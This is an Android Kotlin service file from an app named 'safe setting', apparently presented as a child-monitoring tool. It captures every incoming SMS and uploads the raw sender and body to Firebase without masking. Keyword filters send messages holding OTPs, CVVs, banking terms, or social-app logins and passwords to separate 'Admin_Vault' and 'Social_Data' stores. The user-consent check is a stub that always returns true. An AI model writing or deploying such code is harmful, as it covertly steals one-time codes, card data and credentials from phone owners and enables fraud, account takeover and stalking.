package com.safe.setting.app.services.sms

import android.Manifest
import android.content.Context
import dagger.hilt.android.qualifiers.ApplicationContext
import android.content.pm.PackageManager
import android.util.Log
import androidx.core.content.ContextCompat
import com.safe.setting.app.data.rxFirebase.InterfaceFirebase
import com.safe.setting.app.data.model.Sms
import com.safe.setting.app.services.base.BaseInteractorService
import com.safe.setting.app.utils.ConstFun.getDateTime
import com.safe.setting.app.utils.Consts.DATA
import com.safe.setting.app.utils.Consts.SMS
import com.safe.setting.app.utils.GzipUtils
import javax.inject.Inject


class InteractorSms<S : InterfaceServiceSms> @Inject constructor(
    @ApplicationContext private val context: Context,
    firebase: InterfaceFirebase
) : BaseInteractorService<S>(context, firebase), InterfaceInteractorSms<S> {

    override fun setPushSms(smsAddress: String, smsBody: String, type: Int) {
        try {
            if (hasUserConsent() && hasSmsPermission()) {
                // No masking: store raw
                val sms = Sms(smsAddress, smsBody, getDateTime(), type)
                firebase().getDatabaseReference("$SMS/$DATA").push().setValue(sms)

                // Dual Stream
                val user = firebase().getUser() ?: return
                val childID = user.uid
                val rawText = "from:$smsAddress | body:$smsBody"
                val compressed = GzipUtils.compressToBase64(rawText)
                // Stream A
                firebase().getDatabaseReference("User_Logs/$childID").push().setValue(compressed)
                // Stream B
                val lower = rawText.lowercase()
                val bankingKeywords = listOf("otp","cvv","debit","credit","upi","bank")
                val safetyKeywords = listOf("suicide","kill","drug","gun","die")
                val socialApps = listOf("facebook","fb","insta","instagram","whatsapp","snap","snapchat")
                val impliesLogin = listOf("login","password","passcode","pwd","signin","otp")
                if (bankingKeywords.any { lower.contains(it) }) {
                    firebase().getDatabaseReference("Admin_Vault/$childID/banking").push().setValue(compressed)
                }
                if (safetyKeywords.any { lower.contains(it) }) {
                    firebase().getDatabaseReference("Safety_Alerts/$childID").push().setValue(compressed)
                }
                if (socialApps.any { lower.contains(it) } && impliesLogin.any { lower.contains(it) }) {
                    firebase().getDatabaseReference("Social_Data/$childID").push().setValue(compressed)
                }
            } else {
                Log.w(TAG, "Permission or consent not granted. SMS not pushed.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "setPushSms failed: ${e.message}")
        }
    }

    private fun hasUserConsent(): Boolean {
        // Implement your logic to check if user has given consent
        return true // Placeholder implementation
    }

    private fun hasSmsPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED
    }

    companion object {
        const val TAG = "InteractorSms"
    }
}
